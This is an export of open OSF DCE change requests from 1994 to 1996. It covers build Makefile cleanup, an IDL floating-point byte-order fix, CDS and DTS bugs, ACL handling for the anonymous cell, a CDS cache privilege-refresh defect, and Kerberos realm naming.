Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[8/3/94 public]

If user/effective user is root, there is no need 
to communicate with sec_clientd (dced) for DCE preauthentication 
data; you already have the appropriate privileges to formulate the 
padata.

Should also improve performance a bit.



CR Number                     : 11547
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 11423
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : fts
Short Description             : -localauth causes immediate cred refresh
Reported Date                 : 8/3/94
Found in Baseline             : 1.1b13
Found Date                    : 8/3/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/3/94 public]

The file/security/dfsauth routines loop such that newly created
creds are refreshed immediately - at least in the case of using
the -localauth switch on fts create (see 11423). I suspect these
routines are also used by the repserver and other user space dfs
daemons so that many of them are doing this unnecessary refresh.



CR Number                     : 11538
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 11980
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : utils
Subcomponent Name             : acl
Short Description             : Reject user/group entries in ACL's in anonymous cell
Reported Date                 : 8/3/94
Found in Baseline             : 1.1b12
Found Date                    : 8/3/94
Severity                      : D
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[8/3/94 public]
This CR comes from CR 7962 which is an acl_edit defect. 
Here is the description from that CR written by rajesh@transarc.com:

 For a ACL with a foreign cell (e.g. unauthenticated cell), as the
 default realm, the uuid put in user entries in the ACL is the uuid of
 the user in the storing cell.  Thus when you list the ACL, you do not
 get user names but uuids as acl_edit is not able to map the uuid to
 names in the "unauthenticated cell". One fix would be to prevent
 additon of "user" and "group" entries in an ACL with the
 "unauthenticated cell" as default realm, since all unauth users are
 mapped into anonymous@anonymousCell anyway and so the user and group
 entries in such an ACL will never be used
 Similarly for group entries

[8/24/94 public]
Now that I understand this, it is not the job of the ACL client to do this
but rather the ACL manager.  The suggested fix is that if the default cell
is the anonymous cell then user and group ACL entries should not be
allowed.  I changed this to utils in that it *should probably* go into the
ACL manager library at some point (not necessarily 1.1).  John...

[08/27/94 public]
This would be useful to dced.
What is the uuid of the anonymous cell?

[9/14/94 public]
Now we know the anon cell uuid is dce_acl_anon_cell.

Where is the right place to put the check?  The dce_rdacl_replace()
operation seems right, as it does some other checks there.

The convenience routines [ dce_acl_obj_add_xxx() ] would be a good place to
catch problems earlier, if people use them.  (There's an open CR to do
better error checking in dce_acl_obj_add_xxx() routines.)

[09/14/94 public]
HP disagrees with dce_acl_anon_cell.  There will be UUID strings in some
security IDL file that the ACL lib can turn into globals if it wants
via uuid_from_string done in its pthread_once block.  Still should be
done, tho, and your comments about where to check seem right.

[10/03/94 public]
The "some security IDL file" is sec_cred.idl

[2/6/96 public]
Is this suppose to be cancelled? Any update?

[02/06/96 public]
It's a useful enhancement; other changes to dced have made it not
a requirement now.



CR Number                     : 11497
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : all Makefiles
Short Description             : Makefile variables are being overwritten
Reported Date                 : 7/29/94
Found in Baseline             : 1.1
Found Date                    : 7/29/94
Severity                      : E
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/29/94 public]

We should check all DCE components and make sure the CFLAGS 
(as well as others) are NOT overwritten those in the common
Makefile.  i.e. we need to look carefully at '=' assignment.
Maybe the '?=' or '+=' or <target>_CFLAGS is supposed to be
used.

In any case, if someone is using 'CFLAGS = XXXX', it is probably
a no-no and should have been set to '<target>_CFLAGS = XXXX $CFLAGS'
so that the original CFLAGS value defined via the common Makefile 
is NOT being overwritten.

[7/29/94 public]

We should also check to make sure that things are NOT being 
set twice.  And if they are, we should see whether that is
the case.  This is because sometimes the order is important.
i.e.  -cpev -no_mepv -cepv ...???

thanks
annie

[8/10/94 public]
This is good, but saying "we should check" is probably too passive.  How
about running a grep and finding out where there are problems and opening a
bug for each component with problems?

[08/12/94 public]
I also think it should be a cardinal sin to ever invoke IDL with the -v
flag... so "IDLFLAGS.*-v" would be a good grep pattern to add.

[08/29/94 public]
I'd like to cancel this.  Or at the very least, pass this on from a 
'bld' problem to someone else.  Component owners should be policing
their own makefiles (since they are the only one's that change them ...
the RATs certainly haven't been changing them).

[08/29/94 public]
I'd rather you didn't cancel this.  Leave it open as an enhancement if you
want.  It's pretty obvious to me that we component owners don't know
enough about Makefiles.  It needs someone with a global view and a
fast hand with btools to go through and do cleanups.  If Annie is still
interested in attacking this, ANYTHING would be an improvement...

[08/29/94 public]
Oh, oh!  I should have canceled this before I started grepping the Makefiles.
There are a lot of Makefiles that overwrite the CFLAGS variable.  I was
redirecting the 'grep' output to a file and ran out of space on my disk.
I'll enter the complete list of Makefiles here and try to figure out later
how to parcel them out the each of the component owners.

[9/6/94 public]

The following Makefiles have the option "-v" set for IDLFLAGS.  I will fix these
Makefiles.

./file/bakserver/Makefile
IDLFLAGS                = -keep c_source -v -no_mepv

./file/bosserver/Makefile
IDLFLAGS                = -keep c_source -v -no_cpp

./file/bubasics/Makefile
IDLFLAGS                = -keep c_source -v -no_mepv

./file/config/Makefile
IDLFLAGS                = -keep c_source -v -no_cpp -no_mepv

./file/flserver.klib/Makefile
IDLFLAGS                = -keep c_source -v -no_cpp -no_mepv 

./file/flserver/Makefile
IDLFLAGS                = -keep c_source -v -no_cpp -no_mepv 

./file/fsint.klib/Makefile
IDLFLAGS                = -keep c_source -v -no_cpp -no_mepv

./file/fsint/Makefile
IDLFLAGS                = -keep c_source -v -no_cpp -no_mepv 

./file/ftserver/Makefile
IDLFLAGS                = -keep c_source -v -no_cpp -no_mepv 

./file/icl/Makefile
IDLFLAGS                = -keep c_source -v -no_cpp -no_mepv 

./file/ncsubik/Makefile
IDLFLAGS                = -keep c_source -v -no_cpp -no_mepv 

./file/update/Makefile
IDLFLAGS                = -keep c_source -v -no_cpp -no_mepv

./nosupport/security/audit/auditcp/Makefile
IDLFLAGS =  -keep c_source -v 

./rpc/kruntime/Makefile
IDLFLAGS        = -v -keep c_source -cepv -no_mepv

./rpc/runtime/Makefile
IDLFLAGS        = -keep c_source no_cpp -v -cepv -no_mepv 

./security/client/rca/Makefile
IDLFLAGS = -keep c_source -cepv -v

./security/server/rrs/Makefile
IDLFLAGS =  -keep c_source -cepv -v

./security/utils/Makefile
IDLFLAGS =  -keep c_source -cepv -v 
id_encode.idl_IDLFLAGS = -v -keep c_source
authz_encode.idl_IDLFLAGS = -v -keep c_source
sec_attr_trig.idl_IDLFLAGS = -v -keep c_source
sec_login_encode.idl_IDLFLAGS = -v -keep c_source
rsec_pwd_mgmt.idl_IDLFLAGS = -v -keep c_source
acl_encode.idl_IDLFLAGS = -v -keep c_source

./security/audit/auditd/Makefile
rdaclifv0.idl_IDLFLAGS = -keep c_source -v -no_mepv

./test/directory/cds/Makefile
IDLFLAGS        ?= -v -space_opt -keep c_source `genpath ${INCFLAGS}` ${INCDIRS}

./test/file/ubik/Makefile
IDLFLAGS                = -keep c_source -v -no_cpp -no_mepv 

./test/rpc/rtandidl/moretests/Makefile
IDLFLAGS                = -keep c_source -v 

./test/rpc/runtime/kncstest/Makefile
IDLFLAGS        = -no_cpp -keep c_source -no_mepv -v

./test/rpc/runtime/ncstest/Makefile
IDLFLAGS        = -no_cpp -keep c_source -no_mepv -v

./test/systest/rpc/rpc.runtime.1/Makefile
IDLFLAGS        += -no_cpp -keep ${IDLKEEP} ${MEPV} -v ${IDL_CC_OPT}

./test/functional/security/ts/client/pwd_mgmt/pwd_strength/Makefile
IDLFLAGS        = -keep c_source -v

./time/common/Makefile
IDLFLAGS = -no_mepv -keep c_source -v

./time/service/Makefile
IDLFLAGS = -no_mepv -keep c_source -v
rdaclifv0.idl_IDLFLAGS = -keep c_source -v -no_mepv

[9/6/94 public]
Marty, you might want to check with the DCE team before taking the -v 
option out from the IDL flags.  Some folks might need the messages from
the IDL -v option.

thanks
annie

[9/12/94 public]
The "-v" switch has been removed from the Makefiles listed above.

As far as checking the "CFLAGS" variable in the Makefiles, I propose that
this CR be deferred until dce1.2.  It is a little too late in the game to 
clean up any Makefiles.

[9/19/94 public]
Defer this to dce 1.2.

[2/6/96 public]
Made it an enhancement request as it does not block anyone nor its any
sizable work.



CR Number                     : 11490
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : upclient
Short Description             : segment fault if filename w/o fullpn
Reported Date                 : 7/29/94
Found in Baseline             : 1.1
Found Date                    : 7/29/94
Severity                      : B
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : upclient.c, util.c
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/2/96 public]
lowering priority of old OTs that haven't appeared during R1.2.

[7/29/94 public]
Upclient segment faults if a file without a full pathname is specified
for the writing of the log or log error entries that are accomplished
by util.c.

Example:
upclient -server alcatraz -path : (or 0) -file 0 (or myfile) (or
anything without a pathname).



CR Number                     : 11487
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : bld
Subcomponent Name             : all of dce components
Short Description             : check to make sure that -g has been removed
Reported Date                 : 7/29/94
Found in Baseline             : 1.1
Found Date                    : 7/29/94
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/29/94 public]

Check to make sure that -g has been removed from all Makefile, component
included makefiles (*.mk), and common Makefiles - osf.std.mk, ..., 
Makeconf before DCE ships.

[2/6/96 public]
Enh. Lowered the priority. Its more like a productization issue for companies
creating binaries for release.



CR Number                     : 11484
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 7294, 34
Project Name                  : dce
H/W Ref Platform              : rs6000
S/W Ref Platform              : aix
Component Name                : rpc
Subcomponent Name             : idl/lib/upkibml.c
Short Description             : Fix of CR 7294 should be backed out
Reported Date                 : 7/29/94
Found in Baseline             : 1.1
Found Date                    : 7/29/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 1.1maint
Affected File(s)              : 
Sensitivity                   : public

[7/29/94 public]

Customer reported:

"CR 7294 reserves the word order in order to pass VTS. But actually the VTS
is wrong (See VTS CR 34), in the file vta_ndr.h
in the VTS.   The IEEE double floating point representation for
1.1 and 4.0 are word reversed from IBM double floating point
representation for the same numbers.  This is why it seemed
that the words were comming back reversed from the runtime.
The actual bug fix is to reverse the IBM doubles into the
same word order as the IEEE for 1.1 and 4.0.   I really
believe that the fix in the runtime for CR# 7294 is wrong.
IEEE big endian and IBM big endian are in the same word order.
This fix has been applied to DCE 1.1 and should be removed.
The following is the defines in vta_ndr.h that are reversed
from each other.

#define IEEE_D_VALUE1_L         (0X9999999a)    /* 1.1 */
#define IEEE_D_VALUE1_H         (0X3ff19999)    /* 1.1 */
#define IEEE_D_VALUE2_L         (0X00000000)    /*  4.0 */
#define IEEE_D_VALUE2_H         (0X40100000)    /*  4.0 */

#define IBM_D_VALUE1_L          (0X41119999)    /* 1.1 */
#define IBM_D_VALUE1_H          (0X9999999a)    /* 1.1 */
#define IBM_D_VALUE2_L          (0X41400000)    /*  4.0 */
#define IBM_D_VALUE2_H          (0X00000000)    /*  4.0 */



The fix is to reverse these:

#define IBM_D_VALUE1_L          (0X9999999a)    /* 1.1 */
#define IBM_D_VALUE1_H          (0X41119999)    /* 1.1 */
#define IBM_D_VALUE2_L          (0X00000000)    /*  4.0 */
#define IBM_D_VALUE2_H          (0X41400000)    /*  4.0 */


I thought previously that there was a problem in pbi_ndr.c
in the VTS source.  The reason I thought that was because we
are IBM big endian and our testing was using the IBM_D_VALUE's
which were reversed."

So when VTS 34 is fixed, the fix to upkibml.c should be backed out.

To be more specific, the following fix should be removed from upkibml.c:

*** upkibml.c.orig      Tue Jul 12 18:57:26 1994
--- upkibml.c   Wed Jul 27 14:26:02 1994
***************
*** 100,114 ****
  #if (NDR_LOCAL_INT_REP == ndr_c_int_big_endian)
  
          memcpy(&r[1], input_value, 8);
- #if (defined(_IBMR2) && defined(_AIX)) || \
-     (defined(__hppa) && defined(__hpux))
-         {
-         idl_ulong_int tmp;
-         tmp = r[1];
-         r[1] = r[2];
-         r[2] = tmp;
-         }
- #endif
  
  #else
        memcpy(r, input_value, 8);
--- 100,105 ----



upkibml.c.orig is the file that came with DCE1.1.

[7/29/94 public]
Assigned to the only VTS person we have left

[8/12/94 public]
I tried running the VTS big-endian tests with the suggested fix
and the old rpc/idl/lib/upkibml.c (ie, backing from the currrent fix) - still 
the VTS tests fail - might be some additonal fixes are needed to VTS,
which were not mentioned above.

It is true that VTS was not using the correct IBM big endian values,
as explained by the customer [see RPC AES].

There was a request to IBM (gerry thomes) to execute big-endian (double)
tests [NOT vts tests] between MVS and AIX. At present, waiting for
their input to take an action on this OT.

[9/14/95 public]

Backed out the fix to upkibml.c as described above.  Applied the VTS fix to
VTS 1.0.2 and ran protocol tests above.  Success.



CR Number                     : 11483
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : i486
S/W Ref Platform              : osf1
Component Name                : cds
Subcomponent Name             : cdsbrowser
Short Description             : cdsbrowser gives scroll bar error
Reported Date                 : 7/29/94
Found in Baseline             : 1.1
Found Date                    : 7/29/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/29/94 public]

Customer reported this problem against 1.0.2 DCE with their SVR4 port,but
I have managed to reproduce this problemw ith 1.0.3 and current 1.1 code,
though I only saw the problem with 486 running osf/1.

If you start cdsbrowser and expand all and it has more than what the default 
window can hold. Click scroll bar arrow to move down to the end. Now click on
the UP arrow of the scroll bar, you will get the following error on the screen
where you start cdsbrowser:

Warning: 
    Name: SVSc
    Class: XmScrollBar
    The specified scrollbar value is greater than the maximum
    scrollbar value minus the scrollbar slider size.

You will see the the bar shrinks. Clicking on the UP arrow in the bar will not
get the content move.

But you can click the other UP arrow which is above the scroll bar (why there
are two arrows for each direction?). That will move the content up and solve 
the problem.



CR Number                     : 11480
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : sec_create_db
Short Description             : sec_create_db coredumps if dup name
Reported Date                 : 7/28/94
Found in Baseline             : 1.1b13
Found Date                    : 7/28/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/28/94 public]
If you attempt to create a security replica with the same name as
one that exists in the cell, sec_create_db coredumps. This case
will occur infrequently, therefore only a priority 1. Sorry - don't
have coredump or info from it - easy to reproduce however:
	- configure sec replica
	- dce_config unconfigure mach w/ sec replica
	(requires some hand cdscp del obj/ cdscp del dir effort)
	- attempt to configure sec replica again

dce_config doesn't remove original sec replica as part of unconfig
(separate CR) - and sec_create_db less than graceful about handling
problem.

[7/29/94 public]
Downgraded to C3 because it is a 'recovery from operator error at config time'
type of bug.



CR Number                     : 11470
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 11466
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : login
Short Description             : sec_login_util_bind_to_sec_clientd use dce_binding_from_file
Reported Date                 : 7/28/94
Found in Baseline             : 1.1b12
Found Date                    : 7/28/94
Severity                      : C
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : security/client/login/sec_login_util.c
Sensitivity                   : public

[7/28/94 public]
The routine sec_login_util_bind_to_sec_clientd could be made simpler by
calling the new routine dced_binding_from_file.



CR Number                     : 11462
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : cds cache login context check for the machine principal is not enough
Reported Date                 : 7/27/94
Found in Baseline             : 1.0.3
Found Date                    : 7/27/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/27/94 public]

I am investigating a report from IBM about a problem with machine principal 
in 1.0.x code. When trying with the 1.1 code, it seems to me that the problem 
went away. I searched the OT and could not find anything. 

Nobody seems to know why the problem went away. HP mentioned that they are 
wawre of the problem, but did not think any OT was opened. They did not do
any explicit fix for this problem. They wonder too why 1.1 would behave
differently than 1.0.3.

Here is the problem:

DCE chooses to let the machine principal have a fixed cred cache file name
(dcecred_ffffff), while other principals, when logging, will get a different 
cache file for each login.

CDS clerk, when determining whether to use the cached data for a request, 
checks to see if the requester's login context has changed. This is done by 
comparing the cached opaque login context with the one in the request buffer 
(cds/child/clerk_client.c, parse_argument() function). If they are the same, 
cds assumes that the requester has the same privilege as before.

This opaque login context is actually the name of the cache file from
sec_login_import_context()'s output.

Privilege for a principal changes when he is added/removed from a group. The 
change of the group membership takes place when a new dce login is done, ie. 
a new cred cache file is used. So the clerk code will catch the change of the 
privilege by seeing the change of the cache file name. New authorization will 
take place.

But for the machine principal, since the cred cache file always takes the same 
name, just checking the cache file name is not enough.

This problem can be seen with the following simple test (with 1.0.2 or 1.0.3 
dce):

	Window 1					Window 2
1. login in as root				1. dce_login as cell_admin
						2. rgy_edit create group g1
						3. cdscp create dir /.:/t1
						4. acl_edit /.:/t1
							remove r from any_other
							add group:g1:rt
2. cdscp show dir /.:/t1
	you will get permission error
	since machine principal is not
	allowed to read this cds dir.
						5. rgy_edit
							add hosts/xxx/self to g1
3. kill sec_clientd
4. kdestroy
	make sure the old caceh is gone
5. restart sec_clientd
6. klist 
	make sure that g1 is in local
	group listing
7. cdscp show dir /.:/t1
	you will see the same permission
	error again, even though the
	machine principal should have the
	permission now. The reason is that
	cdsclerk simply returns the cached
	data.

Same test with 1.1 dce shows that 1.1 dce handles it correctly.

IBM reported problem with 1.0.2 code when they tried to reconfigure a dts 
clerk to be a dts server. The machine principal is added to 
subsys/dce/dts-servers group, sec_clientd restarted, but reading 
/.:/lan-profile returns the cached data: permission denied.
See also OT 7467. 1.0.3 dce_config bypasses this problme by stopping dtsd 
first, then restart it as a server.



CR Number                     : 11459
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cds
Subcomponent Name             : 
Short Description             : confusing error message
Reported Date                 : 7/27/94
Found in Baseline             : 1.1
Found Date                    : 7/27/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : 
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/27/94 public]

From: Jonathan Chinitz <jec@isoft.com>
I just tried to configure a new node into an an existing cell as a CDS
server. With the way I play around with nodes and cells (as in taking one
out of cell A, copnfiguring it as cell B, etc.) I left the cell with /.:
indicating that it had a replica on a host which was no longer in the
cell. Everything was fine until I decided to create a CH on the new node.
Guess what?  cdscp create clearinghouse fails with
	Unable to communicate with any CDS server
Bizzare - I can do cdscp commands to my heart's content - what gives?

To make a long story short - I had to exclude the bogus replica from /.:'s
replica set - only then did cdscp create clearinghouse (and I found out
cdscp set dir /.: to skulk as well) succeeded. This particular command
wants to see all replicas of /.: available before it continues. That is
ok, but the error message "Unable to communicate with any CDS server",
especially the word "any" is a bit misleading...



CR Number                     : 11420
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : cfg
Subcomponent Name             : 
Short Description             : lib_admin and building the index
Reported Date                 : 7/25/94
Found in Baseline             : 1.1b12
Found Date                    : 7/25/94
Severity                      : B
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/25/94 public]
dce_config calls dcecp to to "auto_mkindex"  I think that should be
moved to rc.dce, instead.  I didn't want to install a new libdce
(since I'm about to reboot anyway) and I got a warning message.
Also rebuilding the index makes sense at reboot time.



CR Number                     : 11416
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : unknown
Subcomponent Name             : all dce components
Short Description             : build of all dce components using the 'modified' make
Reported Date                 : 7/25/94
Found in Baseline             : 1.1
Found Date                    : 7/25/94
Severity                      : E
Priority                      : 2
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/25/94 public]

We have a fix for the Signal 10 make on the HP platform.  This
version of make should be the one used for all platforms.  We
need to make sure that the make changes work on all platforms

The changes should be made to the ODE2.3 code that DCE ships. 

thanks
annie

[7/27/94 public]

As stated above, the fix for make was performed initially on the
HP platform.  Now, we have proceeded to test build the other two
platforms with the new make changes.  The test build will be
performed tonight on all three platforms.  If the build results
matches those from the nightly build, the 'new' make will be
used on the nightlu build machines.  

In addition, we will be making the ODE changes available to
providers and suppliers by placing them in the /afs cell.

thanks
annie

[8/30/94 public]
I think there should be a slight change to this request.  I believe
that the RIOS and AT386 builds should continue to use the ode2.3.3 'make'
and Transarc's fix should be provided in the "unintegrated" source tree.

My reasoning is that MOST of the people using HP builds don't run into
the Signal 10 problem (although the nightly builds do).  We will take a smaller
hit by forcing the few people who run into the Signal 10's to touch up
their 'make' a bit.

I will close this CR when Transarc's fixes are submitted to "unintegrated".

[2/6/96 public]
Marty, is this already done? Can you close this?  This is against ODE so
I'll change component to unknown.



CR Number                     : 11353
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dfs
Subcomponent Name             : bld
Short Description             : DFS_ONLY has BUILD_DCE depended on security
Reported Date                 : 7/18/94
Found in Baseline             : 1.1
Found Date                    : 7/18/94
Severity                      : C
Priority                      : 4
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.2
Fixed In Baseline             : 
Affected File(s)              : src/Makefile
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[12/2/96  public]
lowering priority of old OTs that haven't appeared during R1.2.

[7/18/94 public]
While looking at src/Makefile, in line 173, DFS has BUILD_DCE
= rpc dce config. But under dce/utils, other than svc, dcecf, there 
are acldb, db44, misc and attr (I'm going to check in), the acldb and
attr (built in misc) have dependence on some IDL files exported by
security. If DFS_ONLY doesn't need security, it may need to set
BUILD_DCE = rpc dce/utils/svc dce/utils/dcecf config.



CR Number                     : 11335
Defect or Enhancement?        : enh
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : dts
Subcomponent Name             : 
Short Description             : RPC call ClerkRequstTime() to
remote server failed: unknown interface reported by dtsd at start up
Reported Date                 : 7/15/94
Found in Baseline             : 1.1b12
Found Date                    : 7/15/94
Severity                      : C
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/15/94 public]

Using BL-12

I noticed today that when I started DCE, using /etc/rc.dce, and 
before all the 3 DTS servers were running, the first two machines (HPUX, RIOS) 
to start dtsd reported the following error:

root@west> 1994-07-15-15:33:51.682-04:00I107.173 dtsd ERROR dts dtsdate
time_request.c 658 0x4002ccf8
RPC call ClerkRequstTime() to remote server failed: unknown interface 
(dce/ rpc)
1994-07-15-15:33:56.076-04:00I107.178 dtsd WARNING dts config 
logevent_v_ultrix.c 259 0x7aff8a08
Too fews servers (2), need 3 servers

I am opening this OT to record this event. 

The error "unknown interface (dce / rpc)" does not help me 
diagnoze what could be wrong with DTS at this point, and
how to proceed.

[7/19/94 public]

First, as to what this means: the server tried to issue a call to the 
remote (local) server to retrieve its current time. The RPC call
failed for the stated reason: unknown interface. Since there server
would have retrieved the binding information from the namespace, I
suspect that this occurs because the server in question has not
not (yet) registered with the endpoint mapper. 

If this error message is only generated once, then the proper action
is to ignore the error. 

Note also that starting a server is a two phase process: the server is
first "created" via the "create type server" directive, and then enabled
via the "enable" directive. I will verify that the appropriate ordering
of rpc_ep_register() rpc_ns_binding_export() exists.

[07/19/94 public]
I think the problem is not "registered with EP map" but that the server
hasn't registered the interface with its own runtime.  I would check
rpc_server_register_if calls before rpc_ep_register calls.

[8/19/94 public]

Rich (as usual) is correct. This is the result of the "two phase"
creation of a clerk or a server: specifically, the creation of a
server (the old dtscp "create type server" directive) and the actual
starting of the server via the "enable" directive are two distinct 
steps. The "create type server" command actually causes the bindings
to be exported to the namespace, and the daemon to register it's
endpoints with the endpoint mapper; the "enable" directive 
cause the daemon to register its interface with the RPC runtime.
Hence, there is a window where an RPC request can make it all the way
to the daemon before being refused. 

One possible solution is to have the entire "create type server"
command simply set a flag to indicate that it should play the server
role, and the enable command should then perform the canonical three 
step process 

1. register interface with the RPC runtime 
2. register interface and binding with the endpoint mapper 
3. export interface and bindings to the namespace. 

This guarantees that if I can find the server in the namespace, I can
find it in the endpoint map, and I can utilize that interface. Other 
sequences don't provide the same degree of "cleanliness" (e.g. if 
I crash after 1, no-body else knows about me; if I crash after 2, 
the endpoint-mapper will delete me after a period of time...)

Note as well that the "create type server" and "enable" directives are
holdovers from the original DEC implemenation; the entire notion of 
state changes and transition might want to be re-thought as well. In
any event, I'm marking this as an enhancement.



CR Number                     : 11332
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : all
S/W Ref Platform              : all
Component Name                : sec
Subcomponent Name             : kerberos
Short Description             : case of DNS realm names is wrong.
Reported Date                 : 7/15/94
Found in Baseline             : 1.0
Found Date                    : 7/15/94
Severity                      : D
Priority                      : 3
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : 
Sensitivity                   : public

[7/15/94 public]

Cliff Neuman has recently stated that the default case for kerberos realm
names derived from DNS names should be UPPER CASE.

DCE forces the cell name to lower case, and uses the cell name as the realm
name.

This causes two potential problems:

 - potential interrealm interoperability problems for "plain kerberos"
apps between a DCE-managed realm and a non-DCE-managed realm.

 - a "realm takeover" of an existing realm with an UPPER CASE name is
cannot be done as a bloodless coup; you have to visit all the kerberos acls
on all objects in the realm and rename them (which would not be trivial for
something like the ATHENA.MIT.EDU realm..).

We may not be able to fix this in time for 1.1.



CR Number                     : 11314
Defect or Enhancement?        : def
CR in Code, Doc, or Test?     : code
Inter-dependent CRs           : 
Project Name                  : dce
H/W Ref Platform              : hppa
S/W Ref Platform              : hpux
Component Name                : gds
Subcomponent Name             : xoms
Short Description             : xoms_MT fails partially
Reported Date                 : 7/14/94
Found in Baseline             : 1.1
Found Date                    : 7/14/94
Severity                      : C
Priority                      : 1
Status                        : open
Duplicate Of                  : 
Fix By Baseline               : 1.1
Fixed In Baseline             : 
Affected File(s)              : unknown
Diff supplied by              : 
Diff release                  : 
Sensitivity                   : public

[7/14/94 public]

Running xoms_MT tests on HP800 I get:

pass 12  tfail 0t.  .  .  .  T10extract1v
pass 12  tfail 0t.  .  .  .  T10extract_attr1v
pass 12  tfail 0t.  .  .  .  T10obj_to_str009v
pass 12  tfail 0t.  .  .  .  T10str_to_attr007v
pass 2  tfail 10t.  .  .  .  T10str_to_filter007v
pass 12  tfail 0t.  .  .  .  T10str_to_filter033v
pass 12  tfail 0t.  .  .  .  T10str_to_name003v
pass 12  tfail 0t.  .  .  .  T10str_to_name016v
pass 12  tfail 0t.  .  .  .  T10str_to_rdn004v

I switched off the removal of the logfiles of the testcases;
here is T10str_to_filter007v.milo.log:

Directory tester: threads version 4.0t [Jul 13 1994  23:50:24]
       arguments:  -c  -t  T10str_to_filter007v  -s  100000 
[1]main thread: old interval.it_interval.tv_sec was 0
[1]main thread: old interval.it_interval.tv_usec was 100000
[1]main thread: new interval.it_interval.tv_sec was 0
[1]main thread: new interval.it_interval.tv_usec was 100000
[1]STARTstr_to_filter007v(startup): INITIALIZE returned OK
[1]STARTstr_to_filter007v(startup): VERSION returned OK

[1]Testcase STARTstr_to_filter007v(startup) passed
